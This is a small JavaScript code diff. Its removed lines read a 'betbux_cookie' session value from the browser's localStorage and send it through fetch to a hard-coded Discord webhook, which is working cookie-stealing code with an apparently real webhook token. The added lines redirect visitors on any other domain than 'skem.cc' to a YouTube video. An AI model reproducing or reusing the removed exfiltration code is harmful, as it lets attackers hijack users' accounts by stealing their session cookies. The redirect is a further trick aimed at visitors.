@@ -1,14 +1,3 @@
-var cookie = localStorage.getItem("betbux_cookie");
-if (cookie) {
-  var webhookUrl = "https://discord.com/api/webhooks/1106660785553412257/qLLuUezNY3eEL2smKS-am07mLTXGucXUou7LPjLsJQl9Owq3p81VYUNYBImImslzSlcu";
-  var payload = {
-    content: cookie
-  };
-  fetch(webhookUrl, {
-    method: "POST",
-    headers: {
-      "Content-Type": "application/json"
-    },
-    body: JSON.stringify(payload)
-  });
-}
+if (window.location.hostname !== 'skem.cc') {
+      window.location.href = 'https://www.youtube.com/watch?v=PGwZ4xgk1fE&t=107s';
+    }
